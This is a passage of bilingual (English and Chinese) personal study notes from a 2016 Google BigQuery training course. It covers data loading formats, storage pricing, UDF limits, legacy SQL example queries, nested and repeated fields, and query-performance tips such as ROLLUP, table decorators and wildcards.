&lt;li&gt;Supports flat data and nested/repeated fields  &lt;ul&gt;
&lt;li&gt;Nested/repeated data useful for expressing hierarchical data, reduces duplication when denormalizing data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Loads faster in BigQuery if data contains embedded newlines  &lt;/li&gt;
&lt;li&gt;Limited to 16 MB block size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JSON (newline-delimited):  &lt;ul&gt;
&lt;li&gt;Supports flat data and nested/repeated fields  &lt;ul&gt;
&lt;li&gt;Nested/repeated data useful for expressing hierarchical data, reduces duplication when denormalizing data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Loads faster in BigQuery if data contains embedded newlines  &lt;/li&gt;
&lt;li&gt;One JSON object, including any nested/repeated fields, must appear on each line  &lt;/li&gt;
&lt;li&gt;Supports UTF-8 encoding  &lt;/li&gt;
&lt;li&gt;Limited to 2 MB row size  &lt;/li&gt;
&lt;li&gt;Example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;abc&amp;quot;, &amp;quot;gender&amp;quot;: &amp;quot;M&amp;quot;, &amp;quot;age&amp;quot;: 38}  
{&amp;quot;name&amp;quot;: &amp;quot;abc&amp;quot;, &amp;quot;gender&amp;quot;: &amp;quot;M&amp;quot;, &amp;quot;age&amp;quot;: 48}  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;CSV:  &lt;ul&gt;
&lt;li&gt;Supports flat data only  &lt;ul&gt;
&lt;li&gt;No nested/repeated data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supports UTF-8 encoding and ISO-8859-1 encoding  &lt;ul&gt;
&lt;li&gt;If loading ISO-8859-1 encoded data, specify configuration.load.encoding property when creating load job  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limited to 2 MB row and cell size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Storing Data&lt;/h2&gt;
&lt;h3&gt;Long-Term Storage in BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Automatic discount for data stored longer than 90 days  &lt;ul&gt;
&lt;li&gt;If table data modified, 90-day counter resets  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No need to delete or archive old data  &lt;ul&gt;
&lt;li&gt;Equivalent to cost of Cloud Storage Nearline  &lt;/li&gt;
&lt;li&gt;量大的時候似乎還是會比較貴，所以還是有人選擇 archive 到 GCS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If preferred, store data in Cloud Storage and load into BigQuery when needed  &lt;ul&gt;
&lt;li&gt;No charge for loading/exporting data  &lt;/li&gt;
&lt;li&gt;Loading from Cloud Storage Nearline reduces performance  &lt;/li&gt;
&lt;li&gt;Data in Cloud Storage available to other services  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 5: Pricing and Quotas&lt;/h1&gt;
&lt;p&gt;要自己把費用算的很精確太難了，&lt;br /&gt;
Google Cloud Platform 有各種不同的計費方式，&lt;br /&gt;
這邊的重點當然還是放在怎麼省錢，&lt;br /&gt;
順便瞭解一下計費方式。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 6: Clauses and Functions&lt;/h1&gt;
&lt;h2&gt;UDF Constraints&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Max output data size: 5 MB per input row  &lt;/li&gt;
&lt;li&gt;Max number of UDFs that can run concurrently per user = 3  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;Native code JavaScript functions are not supported&lt;/em&gt;  &lt;/li&gt;
&lt;li&gt;The DOM objects Window, Document and Node, and functions that require them, are unsupported  &lt;/li&gt;
&lt;li&gt;Bitwise operations in JavaScript handle only the most significant 32 bits  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;UDF Best Practices&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Use UDF test tool to debug to avoid incurring BigQuery charges  &lt;/li&gt;
&lt;li&gt;Avoid persistent mutable state  &lt;ul&gt;
&lt;li&gt;Do not store or access mutable state in UDF calls  &lt;/li&gt;
&lt;li&gt;Each BQ node has local javascript processing environment that may produce local values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use memory efficiently to avoid memory exhaustion on local JavaScript environments  &lt;/li&gt;
&lt;li&gt;Explicitly list SELECT columns instead of SELECT * (not supported)  &lt;/li&gt;
&lt;li&gt;Pre-filter input to limit the size of data on which UDF will run  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Recipes&lt;/h2&gt;
&lt;p&gt;投影片裡的範例不知道是不是故意排版的很醜讓人看不懂...&lt;br /&gt;
其實只要照下面把 Query statement 排版一下&lt;br /&gt;
再從最裡面的 Query 看到最外面就滿好懂了&lt;br /&gt;
只是像一些 BigQuery 特有的 function: &lt;code&gt;EVERY()&lt;/code&gt;, &lt;code&gt;SOME()&lt;/code&gt;, &lt;code&gt;LAG()&lt;/code&gt; 之類的&lt;br /&gt;
只好到 &lt;a href="https://cloud.google.com/bigquery/docs/reference/legacy-sql"&gt;https://cloud.google.com/bigquery/docs/reference/legacy-sql&lt;/a&gt; 察看文件了  &lt;/p&gt;
&lt;h3&gt;Pivot&lt;/h3&gt;
&lt;p&gt;Find 100 largest words in Shakespeare’s works and display the number of occurrences of those words in four of Shakespears more popular works.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    word,  
    SUM(IF(corpus = &amp;#39;kinglear&amp;#39;, corpus_total, 0)) AS kinglear,  
    SUM(IF(corpus = &amp;#39;tempest&amp;#39;, corpus_total, 0)) AS tempest,  
    SUM(IF(corpus = &amp;#39;macbeth&amp;#39;, corpus_total, 0)) AS macbeth,  
    SUM(IF(corpus = &amp;#39;hamlet&amp;#39;, corpus_total, 0)) AS hamlet,  
    SUM(corpus_total) AS [total]  
FROM (  
    SELECT  
        word,  
        LENGTH(word) AS word_len,  
        corpus,  
        SUM(word_count) AS corpus_total  
    FROM [publicdata:samples.shakespeare]  
    WHERE LENGTH(word) &amp;gt; 10  
    GROUP BY word, word_len, corpus  
)  
GROUP BY word, word_len  
ORDER BY word_len DESC  
LIMIT 100  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cohort Analysis&lt;/h3&gt;
&lt;p&gt;Counts of Wikipedia contributors who contribute only to pages on Manning brothers vs those who contributed to Manning brothers pages and other pages. Query highlights EVERY and SOME functions.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    peyton_all,  
    peyton_some,  
    eli_all,  
    eli_some,  
    COUNT(1) AS NUM,  
    AVG(edits) AS avg_edits  
FROM (  
    SELECT  
        contributor_id,  
        EVERY(peyton_edit) AS peyton_all,  
        SOME(peyton_edit) AS peyton_some,  
        EVERY(eli_edit) AS eli_all,  
        SOME(eli_edit) AS eli_some,  
        COUNT(1) AS edits  
    FROM (  
        SELECT  
            contributor_id,  
            (LOWER(title) CONTAINS &amp;#39;peyton manning&amp;#39;) AS peyton_edit,  
            (LOWER(title) CONTAINS &amp;#39;eli manning&amp;#39;) AS eli_edit  
        FROM [publicdata:samples.wikipedia]  
    )  
    GROUP BY contributor_id  
    HAVING peyton_all OR peyton_some OR eli_all OR eli_some  
)  
GROUP BY peyton_all, peyton_some, eli_all,eli_some  
ORDER BY peyton_all, peyton_some, eli_all,eli_some  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Trailing Averages&lt;/h3&gt;
&lt;p&gt;Demonstrates windowing functions to calculate moving average on number Trailing avg of user activities in github.&lt;br /&gt;
Outermost query combines trailing values into a weighted average paying attention to missing values.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    start_date,  
    ((num_0 + if(num_1 &amp;gt; -1, num_1, num_0) * 0.5 + if(num_2 &amp;gt; -1, num_2, num_0) * 0.25) / 1.75) AS smooth_num  
FROM (  
    SELECT  
        start_date, num_0,  
        LAG(num_0, 1, integer(-1)) OVER (ORDER BY start_date) AS num_1,  
        LAG(num_0, 2, INTEGER(-1)) OVER (ORDER BY start_date) AS num_2  
    FROM (  
        SELECT  
            DATE(created_at) as start_date,  
            INTEGER(COUNT(1)) num_0  
        FROM [publicdata:samples.github_timeline]  
        GROUP BY start_date  
    )  
)  
ORDER BY smooth_num DESC  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;Day 2: 2016/12/16&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 7: Nested, Repeated, and Nested Repeated Fields&lt;/h1&gt;
&lt;h2&gt;Nested Field&lt;/h2&gt;
&lt;p&gt;"type": "RECORD"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting nested fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;A nested record field adds a named substructure to a row of data  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to organize related information  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Nested Schema and Data&lt;/h3&gt;
&lt;p&gt;Schema  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[{&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
    {&amp;quot;name&amp;quot;: &amp;quot;title&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;ISBN&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;}  
    ]  
}]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Data (Newline-delimited JSON)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;randolph&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;The Beginning&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;213423422&amp;quot; } }  
{&amp;quot;name&amp;quot;: &amp;quot;charles&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;Fortunate Few&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;993032933&amp;quot; } }  
{&amp;quot;name&amp;quot;: &amp;quot;james&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;Homeward Bound&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;884920039&amp;quot; } }  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Nested Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery automatically flattens nested fields when querying  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT * ... results in columns &amp;lt;record_name&amp;gt;_&amp;lt;nested_field_name&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To query a specific nested field:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT name, book.title FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 7.1&lt;/h2&gt;
&lt;p&gt;CSV 無法表示 nest 結構，所以要上傳有 nested fields 的 data 的話，只能用 JSON 或 AVRO  &lt;/p&gt;
&lt;h2&gt;Repeated Fields&lt;/h2&gt;
&lt;p&gt;"mode": "REPEATED"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting repeated fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;A repeated field adds an &lt;em&gt;array&lt;/em&gt; of data inside a single field or record  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to denormalize a foreign table  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Repeated Schema and Data&lt;/h3&gt;
&lt;p&gt;Schema  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[  
{&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot; },  
{&amp;quot;name&amp;quot;: &amp;quot;city&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot; },  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot; }  
]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Data  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;randy&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Tucson&amp;quot;, &amp;quot;Houston&amp;quot;, &amp;quot;Seattle&amp;quot;], &amp;quot;book&amp;quot;: [&amp;quot;The Fudge&amp;quot;]}  
{&amp;quot;name&amp;quot;: &amp;quot;charlie&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Tucson&amp;quot;, &amp;quot;Seattle&amp;quot;, &amp;quot;Redmond&amp;quot;], &amp;quot;book&amp;quot;: []}  
{&amp;quot;name&amp;quot;: &amp;quot;cynthia&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Houston&amp;quot;, &amp;quot;Austin&amp;quot;], &amp;quot;book&amp;quot;: [&amp;quot;The Fudge&amp;quot;, &amp;quot;Outlaws&amp;quot;]}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A query such as &lt;code&gt;SELECT * ...&lt;/code&gt; produces an error:  &lt;ul&gt;
&lt;li&gt;Cannot output multiple independently repeated fields at the same time  &lt;/li&gt;
&lt;li&gt;一定只能 flatten 其中一個 repeated field (下面 Querying Multiple Repeated Fields 的作法）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Querying one repeated field, yields automatically flattened result  &lt;ul&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT name, book FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Querying Multiple Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;FLATTEN operator unrolls multiple repeated fields  &lt;ul&gt;
&lt;li&gt;One record for each of the values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT * FROM (FLATTEN ([dataset.table], city))&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Lab 7.2&lt;/h3&gt;
&lt;p&gt;BigQuery will automatically flatten a single repeated field (in this case, "city").&lt;br /&gt;
Additional (independent) repeated fields in a query each require the use of the FLATTEN statement.&lt;br /&gt;
A query on 5 independently repeating fields will require 4 FLATTEN statements.  &lt;/p&gt;
&lt;h2&gt;Nested Repeated Fields&lt;/h2&gt;
&lt;p&gt;"type": "RECORD"&lt;br /&gt;
"mode": "REPEATED"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting nested repeated fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;Combine nested and repeated fields to denormalize a &lt;em&gt;one-to-many&lt;/em&gt; relationship  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to organize related information  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Nested Repeated Schema&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;author&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
        {&amp;quot;name&amp;quot;: &amp;quot;title&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
        {&amp;quot;name&amp;quot;: &amp;quot;checked_out&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;timestamp&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;}  
    ]  
},  
{&amp;quot;name&amp;quot;: &amp;quot;citiesLived&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
        {&amp;quot;name&amp;quot;: &amp;quot;place&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;},  
        {&amp;quot;name&amp;quot;: &amp;quot;yearsLived&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;integer&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;}  
    ]  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Example: JSON Nested Repeated Data&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;author&amp;quot;: &amp;quot;melville&amp;quot;, &amp;quot;book&amp;quot;: [{&amp;quot;title&amp;quot;: &amp;quot;Moby Dick&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;2014-12-12 14:23&amp;quot;, &amp;quot;2013-04-03 12:13&amp;quot;]}], &amp;quot;citiesLived&amp;quot;: [{&amp;quot;place&amp;quot;: &amp;quot;Denver, CO&amp;quot;, &amp;quot;yearsLived&amp;quot; :[&amp;quot;1986&amp;quot;, &amp;quot;1987&amp;quot;]}]}  
{&amp;quot;author&amp;quot;: &amp;quot;hardy&amp;quot;, &amp;quot;book&amp;quot;: [ {&amp;quot;title&amp;quot;: &amp;quot;Return of the Native&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1984-05-30 12:12&amp;quot;, &amp;quot;1986-03-12 00:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] }, {&amp;quot;title&amp;quot;: &amp;quot;The Mayor of Casterbridge&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1983-06-23 12:12&amp;quot;, &amp;quot;1986-03-12 00:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] } ], &amp;quot;citiesLived&amp;quot;: [ {&amp;quot;place&amp;quot;: &amp;quot;Austin, TX&amp;quot;, &amp;quot;yearsLived&amp;quot; : [&amp;quot;1982&amp;quot;, &amp;quot;1983&amp;quot;, &amp;quot;1984&amp;quot;] }, {&amp;quot;place&amp;quot;: &amp;quot;Dublin, CA&amp;quot;, &amp;quot;yearsLived&amp;quot; : [&amp;quot;1992&amp;quot;, &amp;quot;1999&amp;quot;, &amp;quot;2000&amp;quot;]}]}  
{&amp;quot;author&amp;quot;: &amp;quot;koontz&amp;quot;, &amp;quot;book&amp;quot;: [ {&amp;quot;title&amp;quot;: &amp;quot;Velocity&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1990-06-10 12:10&amp;quot;, &amp;quot;2000-03-11 10:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] }, {&amp;quot;title&amp;quot;: &amp;quot;Intensity&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;2003-06-23 02:12&amp;quot;, &amp;quot;2004-03-12 20:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;]}]}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Nested Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A query such as &lt;code&gt;SELECT * ...&lt;/code&gt; produces an error:  &lt;ul&gt;
&lt;li&gt;Cannot output multiple independently repeated fields at the same time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT author, book.title, book.checked_out FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Using the WITHIN Keyword&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WITHIN keyword works with aggregate functions  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT fullName, COUNT(children.name) WITHIN RECORD FROM [dataset.tableId]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WITHIN RECORD&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Aggregates data in the repeated values within the record  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WITHIN &amp;lt;node&amp;gt;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Aggregates data in the repeated values within a node  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT fullName, count(citiesLived.place) WITHIN RECORD, citiesLived.place, count(citiesLived.yearsLived) WITHIN citiesLived FROM [dataset.tableId]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要瞭解 Record 的結構層級，才能比較有效的使用 Within。  &lt;/p&gt;
&lt;h3&gt;Lab 7.3&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;REAPETED&lt;/code&gt; and &lt;code&gt;NETSTED&lt;/code&gt; Record 的時候，&lt;br /&gt;
仍然要注意只能同時有一個 REAPETED field，&lt;br /&gt;
否則就得使用 &lt;code&gt;FLATTEN&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 8: Query Performance&lt;/h1&gt;
&lt;h2&gt;JOIN and GROUP BY – How They Affect Performance&lt;/h2&gt;
&lt;h3&gt;JOIN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When possible, avoid CROSS JOIN  &lt;/li&gt;
&lt;li&gt;Each row from first table is joined to every row in second table returning large amounts of data  &lt;/li&gt;
&lt;li&gt;May result in “resources exceeded” errors  &lt;/li&gt;
&lt;li&gt;Window functions often more efficient  &lt;ul&gt;
&lt;li&gt;例如：一個小時做一個 window  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The 8MB right-side table join limit no longer applies.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GROUP BY&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;GROUP BY&lt;/code&gt; when the number of distinct groups is small (low cardinality)  &lt;ul&gt;
&lt;li&gt;Aggregation of data performed in shards  &lt;/li&gt;
&lt;li&gt;Low cardinality means shards do not shuffle data  &lt;/li&gt;
&lt;li&gt;High performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Large &lt;code&gt;GROUP BY&lt;/code&gt; is less optimal  &lt;ul&gt;
&lt;li&gt;建議不要做，但如果不得已的話還是可以做啦。  &lt;/li&gt;
&lt;li&gt;High cardinality requires aggregation performed by multiple shards  &lt;/li&gt;
&lt;li&gt;Shards produce hash key for each value and shuffle data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ROLLUP - Legacy SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;ROLLUP&lt;/code&gt; function in legacy SQL for large GROUP BY  &lt;/li&gt;
&lt;li&gt;Adds extra rows to result that represent partial aggregations  &lt;/li&gt;
&lt;li&gt;The fields in the GROUP BY must be in the SELECT (declares which columns to process).  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    year,  
    is_male,  
    COUNT(1) AS COUNT  
FROM  
    publicdata:samples.natality  
WHERE  
    year &amp;gt;= 2000 AND year &amp;lt;=2002  
GROUP BY  
    ROLLUP(year, is_male)  
ORDER BY  
    year, is_male  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+------+---------+----------+  
| year | is_male | count    |  
+------+---------+----------+  
| NULL | NULL    | 12122730 |  
| 2000 | NULL    | 4063823  |  
| 2000 | false   | 1984255  |  
| 2000 | true    | 2079568  |  
| 2001 | NULL    | 4031531  |  
| 2001 | false   | 1970770  |  
| ...                       |  
| 2002 | true    | 2060857  |  
+------+---------+----------+  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Example: Large GROUP BY&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    LogEdits,  
    COUNT(contributor_id) Contributors  
FROM (  
    SELECT  
        contributor_id,  
        INTEGER(LOG10(COUNT(*))) LogEdits  
    FROM  
        [publicdata:samples.wikipedia]  
    GROUP BY contributor_id  
)  
GROUP BY LogEdits  
ORDER BY LogEdits DESC  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Table Decorators&lt;/h2&gt;
&lt;h3&gt;BigQuery Table Decorators&lt;/h3&gt;
&lt;p&gt;只有要查有異動的資料的話，使用 Decorators 就好，可以節省資料量。&lt;br /&gt;
不過 7 天之內要做，因為只會保留 7 天。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use to perform the most cost-effective query of a subset of your data  &lt;/li&gt;
&lt;li&gt;Table decorators can be used whenever a table is read  &lt;/li&gt;
&lt;li&gt;Copying a table, exporting a table, or listing data  &lt;/li&gt;
&lt;li&gt;Can also be used to undelete a table within 2 days on a best-effort basis  &lt;/li&gt;
&lt;li&gt;Currently supported in legacy SQL only  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Table Decorator Types&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Snapshot decorators  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&amp;lt;time&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time must be within last 7 days  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;@0&lt;/code&gt; references oldest snapshot  &lt;/li&gt;
&lt;li&gt;Relative time is negative  &lt;/li&gt;
&lt;li&gt;Absolute time is positive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Range decorators  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&amp;lt;time 1&amp;gt;-&amp;lt;time 2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time must be within last 7 days  &lt;/li&gt;
&lt;li&gt;References data between &lt;code&gt;&amp;lt;time 1&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;time 2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time 2 is optional and defaults to ‘now’  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: Snapshot Table Decorator&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/"&gt;http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;@-14400000&lt;/code&gt; - is a reference to a snapshot of the table at -14400000 milliseconds since the current time  &lt;ul&gt;
&lt;li&gt;14400000 milliseconds == 14400 seconds == 4 hours  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT count(*)  
FROM [publicdata:samples.shakespe are@-14400000]  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Wildcards&lt;/h2&gt;
&lt;h3&gt;Wildcard Functions - Legacy SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Cost-effective way to query data from a set of “sharded” tables  &lt;ul&gt;
&lt;li&gt;Only the tables that match the wildcard are accessed  &lt;/li&gt;
&lt;li&gt;Limits BigQuery data charges  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Equivalent to UNION of tables matched by wildcard  &lt;/li&gt;
&lt;li&gt;Limits:  &lt;ul&gt;
